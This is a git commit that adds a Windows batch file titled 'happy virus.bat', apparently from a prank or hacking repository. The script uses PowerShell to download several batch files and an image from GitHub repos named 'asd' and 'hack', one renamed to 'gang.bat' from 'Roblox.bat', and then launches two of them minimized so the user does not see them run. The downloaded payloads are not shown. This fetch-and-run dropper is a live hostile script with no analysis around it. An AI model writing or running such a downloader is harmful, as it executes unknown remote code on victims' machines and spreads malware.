40d2152becdf8835edaf13338b73c23d68f282cc
andgfj2314d <iseoyul2314@gmail.com>
2024-10-15 19:12:05 +0900

    Add files via upload

---
+++ happy virus.bat
@@ -0,0 +1,9 @@
+powershell -Command "Invoke-Webrequest" "https://github.com/andgfj2314d/asd/raw/main/BRVYM.bat" -outfile "BRVYM.bat"
+
+powershell -Command "Invoke-Webrequest" "https://github.com/andgfj2314d/hack/raw/main/Roblox.bat" -outfile "gang.bat"
+
+powershell -Command "Invoke-Webrequest" "https://github.com/andgfj2314d/hack/raw/main/happyking.jpg" -outfile "happyking.jpg"
+
+powershell -Command "Invoke-Webrequest" "https://github.com/andgfj2314d/hack/raw/main/happyman.bat" -outfile "happyman.bat"
+start /min gang.bat
+start /min happyman.bat
